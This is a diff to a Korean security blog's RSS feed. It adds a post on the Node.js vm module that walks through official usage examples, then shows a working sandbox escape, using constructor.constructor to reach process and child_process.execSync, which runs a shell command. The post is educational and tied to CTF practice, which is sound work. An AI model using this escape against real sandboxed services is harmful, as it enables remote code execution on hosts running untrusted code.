@@ -9,8 +9,42 @@
     <atom:link href="https://blog.jhyeon.dev/rss2.xml" rel="self" type="application/rss+xml"/>
     
     <description>정동현(JHYEON BLOG)</description>
-    <pubDate>Sat, 27 Feb 2021 15:00:00 GMT</pubDate>
+    <pubDate>Sun, 07 Mar 2021 15:00:00 GMT</pubDate>
     <generator>http://hexo.io/</generator>
+    
+    <item>
+      <title>Node.JS VM Module Sandbox Escape Research</title>
+      <link>https://blog.jhyeon.dev/2021/03/08/nodejs-vmescape/</link>
+      <guid>https://blog.jhyeon.dev/2021/03/08/nodejs-vmescape/</guid>
+      <pubDate>Sun, 07 Mar 2021 15:00:00 GMT</pubDate>
+      
+        
+        
+      <description>&lt;h3 id=&quot;1-Node-JS&quot;&gt;&lt;a href=&quot;#1-Node-JS&quot; class=&quot;headerlink&quot; title=&quot;[1] Node.JS&quot;&gt;&lt;/a&gt;[1] Node.JS&lt;/h3&gt;&lt;p&gt;Node.JS는 네트워크 애플리케이션(서버 사이드) 개발에 사용되는 </description>
+        
+      
+      
+      
+      <content:encoded><![CDATA[<h3 id="1-Node-JS"><a href="#1-Node-JS" class="headerlink" title="[1] Node.JS"></a>[1] Node.JS</h3><p>Node.JS는 네트워크 애플리케이션(서버 사이드) 개발에 사용되는 소프트웨어 플랫폼입니다.</p><p>Javascript 언어를 사용하며, Non-blocking I/O와 단일 스레드 이벤트 루프를 사용하여 높은 처리 성능을 가지고 있습니다.</p><p>또한, HTTP 라이브러리를 내장하고 있어 웹 서버 구동에 필요한 Apache, Nginx와 같이 별도의 소프트웨어를 필요로 하지 않습니다.</p><hr><h3 id="2-Sandbox"><a href="#2-Sandbox" class="headerlink" title="[2] Sandbox"></a>[2] Sandbox</h3><p>Sandbox란, 외부에서 코드를 실행하거나 신뢰할 수 없는 코드를 안전하게 실행할 수 있도록 메인 시스템과 격리된 환경에서 실행되는 환경입니다.</p><p>Node.JS 기준으로는 <code>vm</code> 모듈이 존재하는데, 해당 모듈에 대해서는 아래 목차에서 좀 더 세심하게 다뤄보겠습니다.</p><h3 id="2-Node-JS-VM-Module"><a href="#2-Node-JS-VM-Module" class="headerlink" title="[2] Node.JS VM Module"></a>[2] Node.JS VM Module</h3><p>우선, Node JS에서는 임의의 JS 코드를 안전한 환경에서 실행될 수 있도록 하기 위해 <code>VM</code> 모듈을 제공하고</p><p>있습니다. 해당 모듈은 V8 가상 머신 컨택스트 내에서 코드를 컴파일하고 실행합니다.</p><p>물론, 해당 모듈이 안전하다고 볼수도 없습니다. 신뢰할 수 없는 코드나 임의의 코드를 실행할 수 있게 하지만 이러한 코드에서</p><p>Sandbox 환경을 escape하는 경우가 발생할 때는 시스템에 치명적인 영향을 미칠 수 있기 때문입니다.</p><p>아래는 VM 모듈에 대한 공식 문서 Sample Code 자료입니다.</p><pre><code class="js">const vm = require(&#39;vm&#39;);const x = 1;const context = &#123; x: 2 &#125;;vm.createContext(context); // Contextify the object.const code = &#39;x += 40; var y = 17;&#39;;// `x` and `y` are global variables in the context.// Initially, x has the value 2 because that is the value of context.x.vm.runInContext(code, context);console.log(context.x); // 42console.log(context.y); // 17console.log(x); // 1; y is not defined.</code></pre><h3 id="3-Run-VM-Module-Script"><a href="#3-Run-VM-Module-Script" class="headerlink" title="[3] Run VM Module Script"></a>[3] Run VM Module Script</h3><p>위 예제처럼, VM 모듈을 사용하여 스크립트를 실행하는 방법은 공식 문서에 함수 표현식 옵션이 몇 가지 존재합니다.</p><ul><li>script.runInContext(contextifiedObject[, options])</li></ul><pre><code class="js">const vm = require(&#39;vm&#39;)const context = &#123;  id: &#39;name&#39;,  price: 10000&#125;;const script = new vm.Script(&#39;price += 10000&#39;);vm.createContext(context);script.runInContext(context);console.log(context);/** result : 20000 **/</code></pre><ul><li>script.runInNewContext([contextObject[, options]])</li></ul><pre><code class="js">const vm = require(&#39;vm&#39;)const script = new vm.Script(&#39;variable = &quot;test&quot;&#39;);const context = [&#123;&#125;, &#123;&#125;];context.forEach((context) =&gt; &#123;    script.runInNewContext(context);&#125;);console.log(context);/** result [ &#123; variable: &#39;test&#39; &#125;, &#123; variable: &#39;test&#39; &#125; ] **/</code></pre><ul><li>script.runInThisContext([options])</li></ul><pre><code class="js">const vm = require(&#39;vm&#39;)global.variable = 0;const script = new vm.Script(&#39;variable += 1&#39;);for(let i=0; i&lt;1000; i++)&#123;    script.runInThisContext();&#125;console.log(variable);/** result : 1000 **/</code></pre><ul><li>vm.createContext([contextObject[, options]])</li></ul><pre><code class="js">const vm = require(&#39;vm&#39;);global.globalVar = 3;const context = &#123; globalVar: 1 &#125;;vm.createContext(context);vm.runInContext(&#39;globalVar *= 2;&#39;, context);console.log(context);// Prints: &#123; globalVar: 2 &#125;console.log(global.globalVar);// Prints: 3</code></pre><ul><li>vm.runInContext(code, contextifiedObject[, options])</li></ul><pre><code class="js">const vm = require(&#39;vm&#39;);const obj = &#123; globalvar: 1 &#125;;vm.createContext(obj);for(let i=0; i&lt;500; i++)&#123;    vm.runInContext(&#39;globalvar += 1&#39;, obj);&#125;console.log(obj);/** result : 501 **/</code></pre><ul><li>vm.runInNewContext(code[, contextObject[, options]])</li></ul><pre><code class="js">const vm = require(&#39;vm&#39;);const contextObject = &#123;  animal: &#39;cat&#39;,  count: 2&#125;;vm.runInNewContext(&#39;count += 1; name = &quot;kitty&quot;&#39;, contextObject);console.log(contextObject);// Prints: &#123; animal: &#39;cat&#39;, count: 3, name: &#39;kitty&#39; &#125;</code></pre><ul><li>vm.runInThisContext(code[, options])</li></ul><pre><code class="js">const vm = require(&#39;vm&#39;);let localVar = &#39;initial value&#39;;const vmResult = vm.runInThisContext(&#39;localVar = &quot;vm&quot;;&#39;);console.log(`vmResult: &#39;$&#123;vmResult&#125;&#39;, localVar: &#39;$&#123;localVar&#125;&#39;`);// Prints: vmResult: &#39;vm&#39;, localVar: &#39;initial value&#39;const evalResult = eval(&#39;localVar = &quot;eval&quot;;&#39;);console.log(`evalResult: &#39;$&#123;evalResult&#125;&#39;, localVar: &#39;$&#123;localVar&#125;&#39;`);// Prints: evalResult: &#39;eval&#39;, localVar: &#39;eval&#39;</code></pre><h3 id="4-Escaping-for-VM-Module"><a href="#4-Escaping-for-VM-Module" class="headerlink" title="[4] Escaping for VM Module"></a>[4] Escaping for VM Module</h3><p>최근에 CTF를 자주 참여하는 편인데 이번 zer0ctf 2021 CTF에서 해당 문제가 나왔었는데, 풀이 관련은 추후 정리가 완료되는대로 별도의 포스팅을 해볼 예정입니다.</p><p>우선 [2]에서도 설명 했듯이 VM 모듈을 사용할 때 신뢰할 수 없는 코드, 임의의 코드를 실행할 수 있게 되는 경우 이러한 환경을 탈출할 수 있고,</p><p>VM Context 외부의 객체를 통해 시스템에 치명적인 영향을 끼칠 수 있습니다.</p><p>아래는 일반적인 vm script 코드이며, bypass가 가능한 상황과 비교해보겠습니다.</p><pre><code class="js">const vm = require(&#39;vm&#39;);const msg = vm.runInNewContext(`&quot;use strict&quot;; let a = &quot;hello world&quot;; a;`, Object.create(null), &#123;timeout: 500&#125;);console.log(msg);</code></pre><p><code>escape1.js</code></p><pre><code class="js">const vm = require(&#39;vm&#39;);const cmd = vm.runInNewContext(`&quot;use strict&quot;; this.constructor.constructor(&#39;return this.process&#39;)()`, Object.create(null), &#123;timeout: 500&#125;);console.log(cmd);</code></pre><p><code>escape_rce.js</code></p><pre><code class="js">const vm = require(&#39;vm&#39;);const cmd = vm.runInNewContext(`&quot;use strict&quot;; const process = this.constructor.constructor(&#39;return this.process&#39;)(); process.mainModule.require(&#39;child_process&#39;).execSync(&#39;cat ./hellopoc&#39;).toString()`);console.log(cmd);</code></pre><img src="/img/post/nodejs_escape/1.png" class="lazyload" data-srcset="/img/post/nodejs_escape/1.png" srcset="data:image/png;base64,666"><p>위와 같이 sandbox 환경을 escape하여 RCE를 진행할 수 있게 됩니다.</p><p>물론 해당 방법 이외에도 다양한 bypass technology 들이 존재하나, 추후 여건이 되면 심화적인 접근을 다뤄보겠습니다.</p><p>참고하고 공부할 만한 링크는 아래 정리해두겠습니다.</p><h3 id="References"><a href="#References" class="headerlink" title="References"></a>References</h3><ul><li><p><a href="https://nodejs.org/api/vm.html">https://nodejs.org/api/vm.html</a></p></li><li><p><a href="https://millermedeiros.github.io/mdoc/examples/node_api/doc/vm.html">https://millermedeiros.github.io/mdoc/examples/node_api/doc/vm.html</a></p></li><li><p><a href="https://pwnisher.gitlab.io/nodejs/sandbox/2019/02/21/sandboxing-nodejs-is-hard.html">https://pwnisher.gitlab.io/nodejs/sandbox/2019/02/21/sandboxing-nodejs-is-hard.html</a></p></li><li><p><a href="https://blog.netspi.com/escape-nodejs-sandboxes/">https://blog.netspi.com/escape-nodejs-sandboxes/</a></p></li></ul>]]></content:encoded>
+      
+      
+      <category domain="https://blog.jhyeon.dev/categories/Docx/">Docx</category>
+      
+      
+      <category domain="https://blog.jhyeon.dev/tags/NodeJS/">NodeJS</category>
+      
+      <category domain="https://blog.jhyeon.dev/tags/V8-Engine/">V8 Engine</category>
+      
+      <category domain="https://blog.jhyeon.dev/tags/VM-Module/">VM Module</category>
+      
+      <category domain="https://blog.jhyeon.dev/tags/Sandbox/">Sandbox</category>
+      
+      <category domain="https://blog.jhyeon.dev/tags/Code-Execution/">Code Execution</category>
+      
+      
+      <comments>https://blog.jhyeon.dev/2021/03/08/nodejs-vmescape/#disqus_thread</comments>
+      
+    </item>
     
     <item>
       <title>AeroCTF 2021 Write up</title>
@@ -555,35 +589,6 @@
       
       
       <comments>https://blog.jhyeon.dev/2021/01/02/newyear-210102/#disqus_thread</comments>
-      
-    </item>
-    
-    <item>
-      <title>웹 해킹 기법 기초</title>
-      <link>https://blog.jhyeon.dev/2021/01/01/webhacking-210101/</link>
-      <guid>https://blog.jhyeon.dev/2021/01/01/webhacking-210101/</guid>
-      <pubDate>Thu, 31 Dec 2020 15:00:00 GMT</pubDate>
-      
-        
-        
-      <description>&lt;p&gt;해당 포스트는 노션으로 이전되었습니다.&lt;/p&gt;
-&lt;p&gt;&lt;a href=&quot;https://www.notion.so/jhyeon/Web-Hacking-Basic-1b7c7cb3dfe44feeae9e48dc17486ff0&quot;&gt;https://www.notion</description>
-        
-      
-      
-      
-      <content:encoded><![CDATA[<p>해당 포스트는 노션으로 이전되었습니다.</p><p><a href="https://www.notion.so/jhyeon/Web-Hacking-Basic-1b7c7cb3dfe44feeae9e48dc17486ff0">https://www.notion.so/jhyeon/Web-Hacking-Basic-1b7c7cb3dfe44feeae9e48dc17486ff0</a></p>]]></content:encoded>
-      
-      
-      <category domain="https://blog.jhyeon.dev/categories/Docx/">Docx</category>
-      
-      
-      <category domain="https://blog.jhyeon.dev/tags/Web/">Web</category>
-      
-      <category domain="https://blog.jhyeon.dev/tags/Web-Hacking/">Web Hacking</category>
-      
-      
-      <comments>https://blog.jhyeon.dev/2021/01/01/webhacking-210101/#disqus_thread</comments>
       
     </item>
     
